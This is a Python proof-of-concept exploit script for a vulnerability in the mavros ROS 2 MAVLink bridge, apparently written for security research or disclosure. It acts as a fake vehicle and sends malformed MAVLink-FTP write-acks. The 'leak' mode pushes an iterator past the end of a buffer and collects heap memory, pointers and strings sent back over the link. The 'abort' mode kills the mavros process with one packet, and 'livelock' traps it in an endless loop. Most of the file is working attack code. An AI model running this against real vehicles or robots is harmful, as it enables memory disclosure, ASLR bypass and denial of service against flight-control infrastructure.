#!/usr/bin/env python3
"""
poc_MAVROS02_ftp_write_ack_oob.py

MAVROS-02 -- a malicious vehicle's MAVLink-FTP write-ack controls an unbounded
iterator advance in mavros, and mavros then reads heap memory from the attacker's
chosen offset and SENDS IT BACK over the link.

TARGET   mavros (ROS 2 MAVLink bridge), shipped Debian package ros-jazzy-mavros 2.14.0
VERIFIED source lines below are from the released 2.14.0 tag.

THE CHAIN  (mavros/src/plugins/ftp.cpp, 2.14.0)

    handle_ack_write(req):
      :625  rcpputils::require_true(hdr->size == sizeof(uint32_t));   // ALWAYS throws
      :626  const size_t bytes_written = *req.data_u32();             // attacker's uint32
      :629  const size_t bytes_left_before_advance =
                std::distance(write_it, write_buffer.end());
      :630  rcpputils::assert_true(bytes_written <= bytes_left_before_advance, ...);
      :631  rcpputils::assert_true(bytes_written != 0);
      :634  std::advance(write_it, bytes_written);                    // UNBOUNDED
      :636  const size_t bytes_to_copy = write_bytes_to_copy();

    write_bytes_to_copy():                                            // :991
        return std::min<size_t>(std::distance(write_it, write_buffer.end()),
                                FTPRequest::DATA_MAXSZ);
        // write_it is now PAST end(), so std::distance is a NEGATIVE ptrdiff_t.
        // std::min<size_t> converts it to a huge value, so the min returns
        // DATA_MAXSZ == 239. bytes_to_copy is therefore 239, not 0.

    send_write_command(bytes_to_copy):                                // :750
      :757  std::copy(write_it, write_it + bytes_to_copy, req.data());  // OOB READ
      :758  req.send(uas, last_send_seqnr);                             // ...to the attacker

WHY THE ASSERTS DO NOT SAVE IT
    rcpputils::assert_true() (rcpputils/include/rcpputils/asserts.hpp) is:
        #ifndef NDEBUG
          if (!condition) throw AssertionException{...};
        #else
          (void) condition; (void) msg;
        #endif
    ROS 2 Debian packages are built Release, i.e. with NDEBUG defined, so BOTH
    bounds checks at :630 and :631 compile to nothing in every shipped binary.
    require_true() has no such guard and always throws.

WHY A THROW IS FATAL RATHER THAN HANDLED
    mavros/src/lib/mavros_uas.cpp:115 runs the UAS executor in a bare std::thread:
        exec_spin_thd = thread_ptr(new std::thread([this]() {
            ...
            this->exec.spin();          // no try/catch anywhere in this lambda
        }), ...);
    An exception escaping the function passed to std::thread means std::terminate(),
    so ANY throw out of a message handler aborts the whole mavros process -- the
    router and all plugins -- not merely one thread.

MODES
    leak       the headline. Upload a canary "file", let it complete, then upload a
               small innocuous one and sweep the write-ack offset. Any chunk that
               comes back containing the canary marker is heap memory disclosed
               from a PREVIOUS operation -- unambiguously out of bounds of the
               current buffer.
    abort      reply to the open-ack with size != 4 -> require_true throws -> the
               mavros process dies. One packet.
    livelock   reply with bytes_written == 0. :631 would have caught it; in Release
               it is gone, so mavros makes no progress and re-sends forever.

BENIGN: reads only. Nothing is written to the victim host, no payload is executed.
Authorized bench use against a mavros instance you own.
"""
import argparse
import os
import struct
import subprocess
import sys
import threading
import time

os.environ["MAVLINK20"] = "1"
from pymavlink import mavutil  # noqa: E402

# ---------------------------------------------------------------- FTP protocol
# mavros FTPRequest::PayloadHeader, ftp.cpp -- 12 bytes, then 239 bytes of data.
HDR_FMT = "<HBBBB2xI"          # seqNumber, session, opcode, size, req_opcode, pad, offset
HDR_LEN = struct.calcsize(HDR_FMT)
assert HDR_LEN == 12, HDR_LEN
DATA_MAXSZ = 251 - HDR_LEN     # 239, matches FTPRequest::DATA_MAXSZ
PAYLOAD_LEN = 251

OP_NONE, OP_TERMINATE, OP_RESET, OP_LIST, OP_OPEN_RO, OP_READ, OP_CREATE, \
    OP_WRITE, OP_REMOVE, OP_MKDIR, OP_RMDIR, OP_OPEN_WO, OP_TRUNCATE, \
    OP_RENAME, OP_CRC32, OP_BURST = range(16)
RSP_ACK, RSP_NAK = 128, 129

OPNAMES = {
    OP_NONE: "None", OP_TERMINATE: "TerminateSession", OP_RESET: "ResetSessions",
    OP_LIST: "ListDirectory", OP_OPEN_RO: "OpenFileRO", OP_READ: "ReadFile",
    OP_CREATE: "CreateFile", OP_WRITE: "WriteFile", OP_REMOVE: "RemoveFile",
    OP_MKDIR: "CreateDirectory", OP_RMDIR: "RemoveDirectory",
    OP_OPEN_WO: "OpenFileWO", OP_TRUNCATE: "TruncateFile", OP_RENAME: "Rename",
    OP_CRC32: "CalcFileCRC32", OP_BURST: "BurstReadFile",
    RSP_ACK: "ACK", RSP_NAK: "NAK",
}

CANARY = b"MAVROS02-CANARY-"          # 16 bytes, repeated to fill the decoy upload

C = {"obs": "\033[0;37m", "atk": "\033[1;31m", "ok": "\033[1;32m",
     "warn": "\033[1;33m", "hdr": "\033[1;36m", "rst": "\033[0m"}


def obs(m):
    print("%s[obs]%s %s" % (C["obs"], C["rst"], m))


def atk(m):
    print("%s[atk]%s %s" % (C["atk"], C["rst"], m))


def ok(m):
    print("%s[ok]%s %s" % (C["ok"], C["rst"], m))


def warn(m):
    print("%s[!]%s  %s" % (C["warn"], C["rst"], m))


def banner(t):
    line = "=" * 71
    print("%s%s\n  %s\n%s%s" % (C["hdr"], line, t, line, C["rst"]))


def hexdump(data, prefix="      ", limit=96):
    out = []
    for off in range(0, min(len(data), limit), 16):
        chunk = data[off:off + 16]
        hexs = " ".join("%02x" % b for b in chunk)
        text = "".join(chr(b) if 32 <= b < 127 else "." for b in chunk)
        out.append("%s%04x  %-47s  %s" % (prefix, off, hexs, text))
    if len(data) > limit:
        out.append("%s...   (%d more bytes)" % (prefix, len(data) - limit))
    return "\n".join(out)


class Ros2:
    """Drives the 'operator' side: the ROS service calls a human would make.

    The FTP write path is operator-initiated -- that is the honest precondition
    for this finding -- so the PoC has to actually make those calls rather than
    pretend the attacker can start an upload.
    """

    def __init__(self, ns="/mavros", verbose=False):
        self.ns = ns
        self.verbose = verbose

    CLIENT = "/poc/ftp_client.py"

    def _run(self, args, timeout=330):
        cmd = ("source /opt/ros/jazzy/setup.bash && python3 %s %s"
               % (self.CLIENT, " ".join(args)))
        p = subprocess.run(["bash", "-lc", cmd], capture_output=True, text=True,
                           timeout=timeout)
        out = (p.stdout or "").strip().splitlines()
        for line in out:
            obs("  operator: %s" % line)
        if p.returncode != 0 and p.stderr.strip() and self.verbose:
            obs("  operator stderr: %s" % p.stderr.strip().splitlines()[-1])
        return p

    def open_write(self, path):
        return self._run(["open", path])

    def write(self, path, data, offset=0):
        # Data goes via a file: a 64 KB upload as a YAML array on the command line
        # would be ~320 KB of argv.
        tmp = "/tmp/mavros02-upload.bin"
        with open(tmp, "wb") as fh:
            fh.write(data)
        return self._run(["write", path, tmp, str(offset)])

    def close(self, path):
        return self._run(["close", path])


class FakeVehicle:
    def __init__(self, bind, mode, slide, verbose=False):
        self.mode = mode
        self.slide = slide
        self.verbose = verbose
        self.master = mavutil.mavlink_connection(
            bind, source_system=1, source_component=1, dialect="ardupilotmega")
        obs("listening for mavros on %s (advertising sysid=1 compid=1)" % bind)
        self._run = True
        self.session = 1
        self.mavros_seen = threading.Event()
        # per-run state
        self.phase = "idle"          # idle | canary | attack
        self.write_seen = 0
        self.leaked = []             # captured (offset, bytes) tuples
        self.cycle_chunks = 0
        self.chunks_per_cycle = 4
        self.cur_buf_len = 0
        self.livelock_count = 0
        self.aborted = False

    # -------------------------------------------------------------- plumbing
    def start(self):
        threading.Thread(target=self._hb_loop, daemon=True).start()
        threading.Thread(target=self._rx_loop, daemon=True).start()

    def stop(self):
        self._run = False

    def _hb_loop(self):
        while self._run:
            try:
                self.master.mav.heartbeat_send(
                    mavutil.mavlink.MAV_TYPE_QUADROTOR,
                    mavutil.mavlink.MAV_AUTOPILOT_ARDUPILOTMEGA,
                    mavutil.mavlink.MAV_MODE_FLAG_CUSTOM_MODE_ENABLED, 0,
                    mavutil.mavlink.MAV_STATE_STANDBY)
            except Exception:
                pass
            time.sleep(1.0)

    def _rx_loop(self):
        while self._run:
            try:
                msg = self.master.recv_match(blocking=True, timeout=0.5)
            except Exception:
                time.sleep(0.1)
                continue
            if msg is None:
                continue
            t = msg.get_type()
            if t == "BAD_DATA":
                continue
            if t == "HEARTBEAT" and not self.mavros_seen.is_set():
                ok("mavros is up (heartbeat from sysid=%d compid=%d)"
                   % (msg.get_srcSystem(), msg.get_srcComponent()))
                self.mavros_seen.set()
            elif t == "FILE_TRANSFER_PROTOCOL":
                self._handle_ftp(msg)

    # ------------------------------------------------------------------- FTP
    def _send_payload(self, msg, seq, session, opcode, size, req_opcode, data=b"",
                      offset=0):
        body = struct.pack(HDR_FMT, seq & 0xFFFF, session, opcode, size, req_opcode,
                           offset & 0xFFFFFFFF)
        body += data
        body = body.ljust(PAYLOAD_LEN, b"\x00")[:PAYLOAD_LEN]
        self.master.mav.file_transfer_protocol_send(
            0, msg.get_srcSystem(), msg.get_srcComponent(), list(body))

    def _ack(self, msg, req_hdr, size=0, data=b"", session=None):
        # Two things mavros checks and will bail on:
        #  * ftp.cpp:433-440  incoming_seqnr must equal last_send_seqnr + 1
        #  * ftp.cpp:619      handle_ack_write compares OUR header's offset against
        #                     write_offset, so the offset must be echoed back or the
        #                     op dies with EBADE ("FTP:Write different offset").
        self._send_payload(msg, req_hdr["seq"] + 1,
                           req_hdr["session"] if session is None else session,
                           RSP_ACK, size, req_hdr["opcode"], data,
                           offset=req_hdr["offset"])

    def _nak(self, msg, req_hdr, errno=5):
        """Ends the current operation. Needed because once write_it is past end(),
        std::distance stays negative, write_bytes_to_copy() keeps returning
        DATA_MAXSZ, and mavros will stream out-of-bounds chunks forever. A NAK
        drives it through go_idle() so the node returns to a usable state."""
        self._send_payload(msg, req_hdr["seq"] + 1, req_hdr["session"],
                           RSP_NAK, 1, req_hdr["opcode"], bytes([errno]),
                           offset=req_hdr["offset"])

    def _handle_ftp(self, msg):
        raw = bytes(bytearray(msg.payload))
        seq, session, opcode, size, req_opcode, offset = struct.unpack(
            HDR_FMT, raw[:HDR_LEN])
        data = raw[HDR_LEN:HDR_LEN + size]
        hdr = {"seq": seq, "session": session, "opcode": opcode,
               "size": size, "req_opcode": req_opcode, "offset": offset}
        name = OPNAMES.get(opcode, "op%d" % opcode)

        if opcode == OP_RESET or opcode == OP_TERMINATE:
            obs("mavros -> %s; acking" % name)
            self._ack(msg, hdr)
            return

        if opcode == OP_OPEN_WO or opcode == OP_CREATE:
            path = data.split(b"\x00")[0].decode("utf-8", "replace")
            if self.mode == "abort":
                atk("mavros -> %s '%s'" % (name, path))
                atk("answering the open-ack with size=7 instead of 4.")
                atk("ftp.cpp:562  require_true(hdr->size == sizeof(uint32_t))")
                atk("require_true ALWAYS throws -- NDEBUG does not remove it -- and")
                atk("mavros_uas.cpp:115 spins the executor in a bare std::thread")
                atk("with no catch, so this is std::terminate for the whole process.")
                self._ack(msg, hdr, size=7, data=b"\x00" * 7, session=self.session)
                self.aborted = True
                return
            obs("mavros -> %s '%s'; acking session=%d, size=4"
                % (name, path, self.session))
            self._ack(msg, hdr, size=4, data=struct.pack("<I", 0),
                      session=self.session)
            return

        if opcode == OP_WRITE:
            self.write_seen += 1
            self._handle_write(msg, hdr, data)
            return

        if self.verbose:
            obs("mavros -> %s (size=%d off=%d); acking" % (name, size, offset))
        self._ack(msg, hdr)

    def _handle_write(self, msg, hdr, data):
        """mavros just sent us a chunk it wants written. Our ack's data_u32 becomes
        `bytes_written` in handle_ack_write() and is used verbatim as the argument
        to std::advance()."""
        chunk = data[:hdr["size"]]

        if self.phase == "canary":
            # Behave. Report exactly what it sent so the upload completes and the
            # canary buffer is allocated, filled, and then released.
            if self.write_seen <= 2 or self.verbose:
                obs("write chunk off=%d size=%d -> acking honestly"
                    % (hdr["offset"], hdr["size"]))
            self._ack(msg, hdr, size=4, data=struct.pack("<I", hdr["size"]))
            return

        if self.mode == "livelock":
            self.livelock_count += 1
            if self.livelock_count in (1, 2, 5, 25, 100, 500):
                atk("write-ack #%d with bytes_written=0 (ftp.cpp:631 assert is gone "
                    "in Release) -- mavros makes no progress and re-sends"
                    % self.livelock_count)
            self._ack(msg, hdr, size=4, data=struct.pack("<I", 0))
            return

        # --- attack phase: slide write_it past the end of write_buffer -------
        self.cycle_chunks += 1

        if self.cycle_chunks == 1:
            atk("write chunk off=%d size=%d -- it contains OUR uploaded bytes:"
                % (hdr["offset"], hdr["size"]))
            print(hexdump(chunk, limit=32))
            atk("answering bytes_written=%d (0x%x) for a %d-byte buffer"
                % (self.slide, self.slide, self.cur_buf_len))
            atk("ftp.cpp:634  std::advance(write_it, %d) -> write_it is now %d bytes"
                % (self.slide, self.slide - self.cur_buf_len))
            atk("             past write_buffer.end()")
            self._ack(msg, hdr, size=4, data=struct.pack("<I", self.slide))
            return

        # Every subsequent chunk is out-of-bounds heap: bytes_to_copy came from a
        # NEGATIVE std::distance, min<size_t> turned it into DATA_MAXSZ, and
        # ftp.cpp:757 std::copy'd 239 bytes from past the end into this message.
        self.leaked.append((self.slide, chunk))
        if self.cycle_chunks == 2:
            ok("mavros sent back %d bytes read from write_buffer.data() + %d"
               % (len(chunk), self.slide))
            print(hexdump(chunk, limit=160))
            if CANARY in chunk:
                n = chunk.count(CANARY)
                ok("*** CANARY FOUND (%d occurrence%s) ***" % (n, "" if n == 1 else "s"))
                ok("    Those bytes are from a PREVIOUS, COMPLETED upload. They are")
                ok("    not in the current write_buffer. mavros disclosed them to")
                ok("    the vehicle over MAVLink -- an out-of-bounds heap read whose")
                ok("    contents reach the attacker.")
            else:
                warn("canary not at this offset (heap-layout dependent). The read")
                warn("was still out of bounds -- try another --slide value.")

        # Note the shape of this: distance stays negative, so mavros will keep
        # sending 239-byte out-of-bounds chunks indefinitely. That is a continuous
        # memory-exfiltration channel, not a one-shot. We stop after a few and NAK
        # so the node stays usable for the next probe.
        if self.cycle_chunks >= self.chunks_per_cycle:
            atk("stopping this cycle after %d out-of-bounds chunks (%d bytes) -- "
                "mavros would keep streaming"
                % (self.cycle_chunks - 1, (self.cycle_chunks - 1) * DATA_MAXSZ))
            self._nak(msg, hdr)
            return
        self._ack(msg, hdr, size=4, data=struct.pack("<I", DATA_MAXSZ))

    # ------------------------------------------------------------ scenarios
    def run_abort(self, ros):
        path = "/APM/abort-probe.txt"
        atk("scenario: single malformed open-ack -> whole-process abort")
        ros.open_write(path)
        time.sleep(2.0)

    def run_livelock(self, ros):
        path = "/APM/livelock-probe.txt"
        atk("scenario: bytes_written=0 -> infinite write/ack loop")
        ros.open_write(path)
        self.phase = "attack"
        self.cur_buf_len = 64
        ros.write(path, b"L" * 64)
        time.sleep(8.0)
        atk("observed %d write commands for a single 64-byte upload"
            % self.livelock_count)

    @staticmethod
    def _pointerish(data):
        """Count 8-byte little-endian words that look like aarch64 heap pointers
        (0x0000aaaa........). Leaked pointers are an ASLR-defeating disclosure in
        their own right, independent of whether the canary lands."""
        n = 0
        for off in range(0, len(data) - 7, 8):
            w = struct.unpack_from("<Q", data, off)[0]
            if 0x0000aaaa00000000 <= w <= 0x0000ffffffffffff:
                n += 1
        return n

    @staticmethod
    def _strings(data, minlen=6):
        """Printable ASCII runs in the disclosed bytes. Makes the leak legible:
        recognisable strings out of the victim's heap are more convincing than a
        wall of hex."""
        out, cur = [], bytearray()
        for b in data:
            if 32 <= b < 127:
                cur.append(b)
            else:
                if len(cur) >= minlen:
                    out.append(bytes(cur).decode("ascii", "replace"))
                cur = bytearray()
        if len(cur) >= minlen:
            out.append(bytes(cur).decode("ascii", "replace"))
        return out

    def run_leak(self, ros, canary_kb, slides, buf_bytes=0):
        # Phase 1 -- a benign-looking upload whose contents we will later recover.
        buf_len = buf_bytes if buf_bytes else canary_kb * 1024
        canary = (CANARY * (buf_len // len(CANARY) + 1))[:buf_len]
        obs("the operator uploads a %d KB file whose contents are %r repeated."
            % (canary_kb, CANARY))
        obs("that buffer is write_buffer. Every offset we ask for BEYOND %d is"
            % buf_len)
        obs("therefore out of bounds by construction -- no heap guesswork needed.")
        for i, delta in enumerate(slides):
            slide = buf_len + delta
            self.slide = slide
            self.phase = "attack"
            self.cycle_chunks = 0
            self.cur_buf_len = buf_len
            apath = "/APM/mission-notes-%d.txt" % i
            obs("")
            obs("probe %d: bytes_written = %d  (buffer is %d, so +%d PAST the end)"
                % (i, slide, buf_len, delta))
            ros.open_write(apath)
            ros.write(apath, canary)
            ros.close(apath)
            time.sleep(0.5)


def main():
    p = argparse.ArgumentParser(description="MAVROS-02 FTP write-ack OOB read PoC")
    p.add_argument("--bind", default="udpin:0.0.0.0:14557",
                   help="where mavros's fcu_url points (default udpin:0.0.0.0:14557)")
    p.add_argument("--mode", choices=("leak", "abort", "livelock"), default="leak")
    p.add_argument("--slides", default="16,4096,65536,1048576",
                   help="comma-separated offsets PAST THE END of the uploaded buffer "
                        "to read from (bytes_written = buffer_len + delta)")
    p.add_argument("--buf-bytes", type=int, default=0,
                   help="exact uploaded buffer size in bytes; overrides --canary-kb. "
                        "A SMALL buffer lands in the main arena next to live objects, "
                        "so walking forward from it traverses real heap data.")
    p.add_argument("--canary-kb", type=int, default=8,
                   help="size of the uploaded canary buffer in KB (default 8)")
    p.add_argument("--chunks", type=int, default=8,
                   help="out-of-bounds chunks to pull per probe (default 8)")
    p.add_argument("--ns", default="/mavros", help="mavros namespace")
    p.add_argument("-v", "--verbose", action="store_true")
    a = p.parse_args()

    banner("MAVROS-02: FTP write-ack -> unbounded std::advance -> heap disclosure")
    warn("BENIGN PoC: reads only. Nothing is written to the victim and no payload")
    warn("is executed. Authorized bench use against a mavros you own.")
    obs("target: ros-jazzy-mavros 2.14.0 (shipped Debian package, Release/NDEBUG)")
    obs("mode  : %s" % a.mode)

    v = FakeVehicle(a.bind, a.mode, 0, a.verbose)
    v.chunks_per_cycle = max(2, a.chunks + 1)
    v.start()
    obs("waiting for mavros to come up ...")
    if not v.mavros_seen.wait(timeout=90):
        warn("no heartbeat from mavros within 90s -- check fcu_url and --bind")
        return 1
    time.sleep(3.0)   # let the initial handshake settle

    ros = Ros2(a.ns, a.verbose)
    if a.mode == "abort":
        v.run_abort(ros)
    elif a.mode == "livelock":
        v.run_livelock(ros)
    else:
        slides = [int(s, 0) for s in a.slides.split(",") if s.strip()]
        v.run_leak(ros, a.canary_kb, slides, a.buf_bytes)

    print("")
    banner("RESULT")
    if a.mode == "abort":
        obs("check whether the mavros process is still alive:")
        obs("  pgrep -a mavros_node   (expect nothing)")
    elif a.mode == "livelock":
        obs("write commands observed for one 64-byte upload: %d" % v.livelock_count)
    else:
        total = sum(len(d) for _, d in v.leaked)
        ptrs = sum(FakeVehicle._pointerish(d) for _, d in v.leaked)
        cans = sum(d.count(CANARY) for _, d in v.leaked)
        obs("out-of-bounds chunks received : %d" % len(v.leaked))
        obs("out-of-bounds bytes disclosed : %d" % total)
        obs("heap-pointer-shaped qwords    : %d" % ptrs)
        obs("canary occurrences            : %d" % cans)
        blob = b"".join(d for _, d in v.leaked)
        found = [x for x in FakeVehicle._strings(blob) if CANARY.decode() not in x]
        if found:
            obs("printable strings recovered from the disclosed memory: %d" % len(found))
            for x in found[:18]:
                ok("  %r" % x[:96])
        if v.leaked:
            ok("CONFIRMED: mavros read past the end of write_buffer at an")
            ok("attacker-chosen offset and transmitted the bytes to the vehicle.")
            if ptrs:
                ok("The disclosed bytes include %d heap-pointer-shaped words --" % ptrs)
                ok("that is an ASLR-defeating heap address leak, not just noise.")
            if cans:
                ok("They also include %d copies of the canary from freed" % cans)
                ok("deserialisation buffers of the same upload.")
        else:
            warn("no out-of-bounds chunk captured -- check the mavros log")
    v.stop()
    return 0


if __name__ == "__main__":
    sys.exit(main())
